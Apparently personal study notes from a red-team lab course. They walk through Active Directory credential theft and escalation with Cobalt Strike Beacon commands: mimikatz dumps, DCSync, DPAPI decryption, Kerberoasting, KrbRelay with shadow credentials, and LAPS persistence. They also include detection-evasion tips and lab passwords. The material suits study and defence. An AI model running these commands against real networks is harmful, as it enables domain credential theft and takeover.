Once elevated on a machine, we can obtain credential material for other users who are authenticated.  Credentials can come in the form of plaintext (username & password), hashes (NTLM, AES, DCC, NetNTLM, etc), and Kerberos tickets.

## Logonpasswords

---

[[mimikatz#logonpasswords]]

`View > Credentials`


## Kerberos Encryption Keys

---

[[mimikatz#ekeys]]

`View > Credentials > Add` (to add AES256 hashes)


## Security Account Manager (SAM)

---

The Security Account Manager (SAM) database holds the NTLM hashes of local accounts only.

[[mimikatz#sam]]


## Domain Cached Credentials

---

Domain Cached Credentials (DCC) was designed for instances where domain credentials are required to logon to a machine, even whilst it's disconnected from the domain (think of a roaming laptop for example).  The local device caches the domain credentials so authentication can happen locally, but these can be extracted and cracked offline to recover plaintext credentials.

Unfortunately, the hash format is not NTLM so it can't be used with pass the hash.  The only viable use for these is to crack them offline.

[[mimikatz#cache]]


## Kerberos Tickets

---

1. [[Rubeus#triage]]
2. [[Rubeus#dump]]


## DCSync

---

The [Directory Replication Service (MS-DRSR) protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/f977faaa-673e-4f66-b9bf-48c640241d47) is used to synchronise and replicate Active Directory data between domain controllers.  DCSync is a technique which leverages this protocol to extract username and credential data from a DC.

Beacon has a dedicated `dcsync` command, which calls `mimikatz lsadump::dcsync` in the background.

[[mimikatz#dcsync]]

```
beacon> make_token DEV\nlamb F3rrari

beacon> dcsync dev.cyberbotic.io DEV\krbtgt
```


## Cracking Hashes

---

To learn about cracking the dumped hashes please refer to [[Password Cracking]].


## Impersonation

---

To learn about user impersonation please refer to [[User Impersonation]].


## Data Protection API (DAPI)

---

The Data Protection API (DPAPI) is a component built into Windows that provides a means for encrypting and decrypting data "blobs".  It uses cryptographic keys that are tied to either a specific user or computer and allows both native Windows functionality and third-party applications to protect/unprotect data transparently to the user.

DPAPI is used by the Windows Credential Manager to store saved secrets such as RDP credentials, and by third-party applications like Google Chrome to store website credentials.

### Credential Manager

The way the Windows Credential Manager works is a bit confusing at first - if you read up on the subject, you'll find both the terms "Vaults" and "Credentials".  A "vault" essentially holds records of encrypted credentials and a reference to the encrypted blobs.  Windows has two vaults: Web Credentials (for storing browser credentials) and Windows Credentials (for storing credentials saved by mstsc, etc).  A "credential" is the actual encrypted credential blob.

To enumerate a user's vaults, you can use the native `vaultcmd` tool.

```
beacon> run vaultcmd /list
```

```
beacon> run vaultcmd /listcreds:"Windows Credentials" /all
```

or

[[Seatbelt#WindowsVault]]

Seatbelt can also enumerate them using the `WindowsCredentialFiles` parameter.

[[Seatbelt#WindowsCredentialFiles]]

Seatbelt also provides the GUID of the master key used to encrypt the credentials.  The master keys are stored in the users' roaming "Protect" directory.  But guess what... they're also encrypted.

```
beacon> ls C:\Users\bfarmer\AppData\Roaming\Microsoft\Protect\S-1-5-21-569305411-121244042-2357301523-1104
```

So we must decrypt the master key first to obtain the actual AES128/256 encryption key, and then use that key to decrypt the credential blob.  There are two ways of doing this.

1. The first is only possible if you have local admin access on the machine and if the key is cached in LSASS.  It will not be in the cache if the user has not recently accessed/decrypted the credential. [[mimikatz#dpapi#Elevated]]
2. Another way to obtain the master key (which does not require elevation or interaction with LSASS), is to request it from the domain controller via the Microsoft BackupKey Remote Protocol (MS-BKRP).  This is designed as a failsafe in case a user changes or forgets their password, and to support various smart card functionality. [[mimikatz#dpapi#Not Elevated]]
   This will only work if executed in the context of the user who owns the key.  If your Beacon is running as another user or SYSTEM, you must impersonate the target user somehow first, then execute the command using the `@` modifier.

Finally, the blob can be decrypted.
[[mimikatz#cred (decrypt)]]


### Scheduled Task Credentials

Scheduled Tasks can save credentials so that they can run under the context of a user without them having to be logged on.  If we have local admin privileges on a machine, we can decrypt them in much the same way.  The blobs are saved under `C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\`.

1. [[mimikatz#cred (get MasterKey)]]
2. [[mimikatz#dpapi#Elevated]]
3. [[mimikatz#cred (decrypt)]]


## Kerberos

---

Kerberos is a fun topic and contains some of the more well-known abuse primitives within Active Directory environments. It can also be a bit elusive as to how it works since it has so many complex intricacies, but here's a brief overview:

![](https://rto-assets.s3.eu-west-2.amazonaws.com/kerberos/overview.png)

When a user logs onto their workstation, their machine will send an **AS-REQ** message to the Key Distribution Center (KDC), aka Domain Controller, requesting a TGT using a secret key derived from the user’s password.

The KDC verifies the secret key with the password it has stored in Active Directory for that user. Once validated, it returns the TGT in an **AS-REP** message. The TGT contains the user's identity and is encrypted with the KDC secret key (the **krbtgt** account).

When the user attempts to access a resource backed by Kerberos authentication (e.g. a file share), their machine looks up the associated Service Principal Name (SPN). It then requests (**TGS-REQ**) a Ticket Granting Service Ticket (TGS) for that service from the KDC, and presents its TGT as a means of proving they're a valid user.

The KDC returns a TGS (**TGS-REP**) for the service in question to the user, which is then presented to the actual service. The service inspects the TGS and decides whether it should grant the user access or not.


### Kerberoasting

Kerberoasting is a technique for requesting TGS’ for services running under the context of domain accounts and cracking them offline to reveal their plaintext passwords.  Rubeus `kerberoast` can be used to perform the kerberoasting.  Running it without further arguments will roast every account in the domain that has an SPN (excluding krbtgt).

[[Rubeus#kerberoast#All Users]]

These hashes can be cracked offline to recover the plaintext passwords for the accounts.  Use `--format=krb5tgs --wordlist=wordlist hashes` for john or `-a 0 -m 13100 hashes wordlist` for hashcat.

- [[JohnTheRipper#Crack krb5tgs]]
- [[hashcat#Crack krb5tgs]]

I experienced some hash format incompatibility with john.  Removing the SPN so it became: `$krb5tgs$23$*mssql_svc$dev.cyberbotic.io*$6A9E[blah]` seemed to address the issue.

**OPSEC**  
  
By default, Rubeus will roast every account that has an SPN.  Honey Pot accounts can be configured with a "fake" SPN, which will generate a 4769 event when roasted.  Since these events will never be generated for this service, it provides a high-fidelity indication of this attack.

A much safer approach is to enumerate possible candidates first and roast them selectively.  This LDAP query will find domain users who have an SPN set.

[[ADSearch#Enumerate Kerberoastable Users]]

We can roast an individual account the `/user` parameter.

[[Rubeus#kerberoast#One User]]


### ASREP Roasting

If a user does not have Kerberos pre-authentication enabled, an AS-REP can be requested for that user, and part of the reply can be cracked offline to recover their plaintext password.

1. [[ADSearch#Enumerate ASREP Roastable Users]]
2. [[Rubeus#asreproast]]

Use `--format=krb5asrep --wordlist=wordlist squid_svc` for john or `-a 0 -m 18200 squid_svc wordlist` for hashcat.

- [[JohnTheRipper#Crack krb5asrep]]
- [[hashcat#Crack krb5asrep]]

**OPSEC**  
  
ASREPRoasting with will generate a 4768 event with RC4 encryption and a preauth type of 0.


### Shadow Credentials

There is a Key Trust model, where trust is established based on raw key data rather than a certificate.  This requires a client to store their key on their own domain object, in an attribute called `msDS-KeyCredentialLink`.  The basis of the "shadow credentials" attack is that if you can write to this attribute on a user or computer object, you can obtain a TGT for that principal.  As such, this is a DACL-style abuse as with RBCD.

First, we want to list any keys that might already be present for a target - this is important for when we want to clean up later.

```
beacon> execute-assembly C:\Tools\Whisker\Whisker\bin\Release\Whisker.exe list /target:dc-2$
```

Add a new key pair to the target.

```
beacon> execute-assembly C:\Tools\Whisker\Whisker\bin\Release\Whisker.exe add /target:dc-2$
```

And now, we can ask for a TGT using the Rubeus command that Whisker provides.

[[Rubeus#asktgt]]

Whisker's `clear` command will remove any and all keys from msDS-KeyCredentialLink.  This is a bad idea if a key was already present, because it will break legitimate passwordless authentication that was in place.  If this was the case, you can list the entries again and only remove the one you want.

```
beacon> execute-assembly C:\Tools\Whisker\Whisker\bin\Release\Whisker.exe list /target:dc-2$

beacon> execute-assembly C:\Tools\Whisker\Whisker\bin\Release\Whisker.exe remove /target:dc-2$ /deviceid:58d0ccec-1f8c-4c7a-8f7e-eb77bc9be403
```


### Kerberos Relay Attacks

One major challenge in relaying Kerberos is that service tickets are encrypted with the service's secret key.  A ticket for CIFS/HOST-A cannot be relayed to CIFS/HOST-B because HOST-B would be unable to decrypt a ticket that was encrypted for HOST-A.  However, in Windows, the service's secret key is derived from the principal associated with its SPN and is not necessarily unique per-service.  Most services run as the local SYSTEM, which in a domain context, is the computer account in Active Directory.  Therefore, service tickets for services run on the same host, such as CIFS/HOST-A and HTTP/HOST-A, would be encrypted with the same key.

The attacker starts a malicious RPC server that will force connecting clients to authenticate to it using Kerberos only, and by using appropriate security bindings, they can specify a completely arbitrary SPN.  This will force a service ticket to be generated for a service/SPN that that attacker doesn't control, such as HOST/DC.  They then coerce a privileged COM server into connecting to their malicious RPC server, which will perform the authentication and generate the appropriate Kerberos tickets.  In this example, the malicious RPC server would receive a KRB_AP_REQ for HOST/DC as the local computer account, which the attacker can relay to LDAP/DC instead.  With a valid service ticket for LDAP, they can submit requests to the DC as the computer account to modify the computer object in Active Directory.  This opens the door for other attacker primitives like RBCD and shadow credentials in order to achieve the LPE.

There are tools such as [KrbRelayUp](https://github.com/ShorSec/KrbRelayUp) that automate most of the exploitation steps required, but we'll do them manually.  The primary reason is 1) that we understand all of the steps in more detail; and 2) we know how and what clean-up afterwards (which these tools often omit).  For the relaying, we'll use the original [KrbRelay](https://github.com/cube0x0/KrbRelay) tool by [cube0x0](https://twitter.com/cube0x0); and for the LPE, tools we're already familiar with including StandIn, Whisker, and Rubeus.

One unfortunate aspect to KrbRelay is that because it uses the BouncyCastle Crypto package (which is quite large), its total compiled size is larger than the default task size allowed for Beacon.  Trying to run it with `execute-assembly` will throw an error:

```
beacon> execute-assembly C:\Tools\KrbRelay\KrbRelay\bin\Release\KrbRelay.exe
[-] Task size of 1727291 bytes is over the max task size limit of 1048576 bytes.
```

We could try and modify the tool to make it smaller or modify Beacon's task size to make it larger.  The latter option is quite straightforward because it can controlled with the `tasks_max_size` setting in Malleable C2 - the downside is that it cannot be applied retrospectively to existing Beacons.  To double the task size, add `set tasks_max_size "2097152";` to the top of your C2 profile.

You will notice significantly more lag within the CS client when executing tasks with large artifacts.

You must also remember to restart the team server and re-generate your payloads after making changes to the Malleable C2 profile.

#### RBCD

As mentioned in the RBCD lesson, it is necessary to have control over another computer object to abuse.  If available, the easiest way is to add your own computer object to the domain and get its SID.

```
beacon> execute-assembly C:\Tools\StandIn\StandIn\StandIn\bin\Release\StandIn.exe --computer EvilComputer --make
```

```
beacon> powershell Get-DomainComputer -Identity EvilComputer -Properties objectsid
```

The next step is to find a suitable port for the OXID resolver to circumvent a check in the Remote Procedure Call Service (RPCSS).  This can be done with `CheckPort.exe`.

```
beacon> execute-assembly C:\Tools\KrbRelay\CheckPort\bin\Release\CheckPort.exe
```

With that, run KrbRelay.

```
beacon> execute-assembly C:\Tools\KrbRelay\KrbRelay\bin\Release\KrbRelay.exe -spn ldap/dc-2.dev.cyberbotic.io -clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8 -rbcd S-1-5-21-569305411-121244042-2357301523-9101 -port 10
```

Where:

- `-spn` is the target service to relay to.
- `-clsid` represents `RPC_C_IMP_LEVEL_IMPERSONATE`.
- `-rbcd` is the SID of the fake computer account.
- `-port` is the port returned by CheckPort.

If we query `WKSTN-2$`, we'll see that there's now an entry in in its _msDS-AllowedToActOnBehalfOfOtherIdentity_ attribute.

```
beacon> powershell Get-DomainComputer -Identity wkstn-2 -Properties msDS-AllowedToActOnBehalfOfOtherIdentity

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```

Because we have the password associated with EvilComputer, we can request a TGT and perform an S4U to obtain a usable service tickets for WKSTN-2.  Let's use this to get a ticket for `HOST/WKSTN-2`.

1. [[Rubeus#asktgt]]
2. [[Rubeus#s4u]]

To perform the elevation, we'll use this ticket to interact with the local Service Control Manager over Kerberos to create and start a service binary payload.  To streamline this, I've created a BOF and Aggressor Script that registers a new `elevate` command in Beacon.  It can be found in `C:\Tools\SCMUACBypass` and is based on James' [SCMUACBypass](https://gist.github.com/tyranid/c24cfd1bd141d14d4925043ee7e03c82) gist.

```
beacon> elevate svc-exe-krb tcp-local
```


#### Shadow Credentials

The advantage of using shadow credentials over RBCD is that we don't need to add a fake computer to the domain.  First, verify that WKSTN-2 has nothing in its `msDS-KeyCredentialLink` attribute.

```
beacon> execute-assembly C:\Tools\Whisker\Whisker\bin\Release\Whisker.exe list /target:wkstn-2$
```

Run KrbRelay as before, but this time with the `-shadowcred` parameter.

```
beacon> execute-assembly C:\Tools\KrbRelay\KrbRelay\bin\Release\KrbRelay.exe -spn ldap/dc-2.dev.cyberbotic.io -clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8 -shadowcred -port 10
```

  If you perform these attacks back-to-back and see an error like `(0x800706D3): The authentication service is unknown.` then reboot the machine or wait for the next clock sync.

Like Whisker does, KrbRelay will helpfully provide a full Rubeus command that will request a TGT for WKSTN-2.  However, it will return an RC4 ticket so if you want an AES instead, do:

[[Rubeus#asktgt#Get AES Ticket]]

The S4U2Self trick can then be used to obtain a HOST service ticket like we did with RBCD.

[[Rubeus#s4u self#altservice#Pass the Ticket]]


## Network Access Account Credentials

---

In a Windows environment, the majority of computers will be domain-joined and will therefore authenticate to SCCM Software Distribution Points (SDPs) (basically just SMB shares) using their own machine account credentials.  However, some computers may not be domain-joined.  Network Access Account credentials (NAAs) are domain credentials intended to be used by these machines to access the SDPs over the network.  They are passed to the machines as part of the SCCM machine policies, which are then encrypted using DPAPI and stored locally.  If they are present, privileged users can retrieve these credential blobs via WMI or directly from disk and decrypt them to recover plaintext credentials.

Use `local naa` with `-m wmi` or `-m disk`.

[[SharpSCCM#local naa]]

These credentials should only have read access to the SDP, but are often times over privileged (sometimes even domain/enterprise admins).

```
beacon> make_token cyberbotic.io\sccm_svc Cyberb0tic
```

An alternate approach is to request a copy of the policy directly from SCCM using `get naa`.  This also requires local admin on the local machine to obtain a copy of its SMS Signing and SMS Encryption certificates.


## LAPS ms-Mcs-AdmPwd

---

We can discover which principals are allowed to read the ms-Mcs-AdmPwd attribute by reading its DACL on each computer object.

```
beacon> powershell Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "ms-Mcs-AdmPwd" -and $_.ActiveDirectoryRights -match "ReadProperty" } | select ObjectDn, SecurityIdentifier
```

[[PowerView#ConvertFrom-SID]]

Dedicated tooling such as the [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) also exist.  `Find-LAPSDelegatedGroups` will query each OU and find domain groups that have delegated read access.

```
beacon> powershell-import C:\Tools\LAPSToolkit\LAPSToolkit.ps1
beacon> powershell Find-LAPSDelegatedGroups
```

`Find-AdmPwdExtendedRights` goes a little deeper and queries each individual computer for users that have "All Extended Rights".  This will reveal any users that can read the attribute without having had it specifically delegated to them.

To get a computer's password, simply read the attribute.

[[PowerView#Get-DomainComputer#Read Property]]


### Password Expiration Protection

Since we were able to compromise WKSTN-1 using its LAPS password, we can set its expiration long into the future as a form of persistence.  The expiration date is an 18-digit timestamp calculated as the number of 100-nanosecond intervals that have elapsed since 1st January 1601 (don't ask).

Use `ms-Mcs-AdmPwd`, `ms-Mcs-AdmPwdExpirationTime` properties.

[[PowerView#Get-DomainComputer#Read Property]]

Where `133101494718702551` is Thursday, 13 October 2022 15:44:31 GMT.

If we wanted to push the expiry out by 10 years, we can overwrite this value with `136257686710000000`.  Every computer has delegated access to write to this password field, so we must elevate to SYSTEM on WKSTN-1.

[[PowerView#Set-DomainObject]]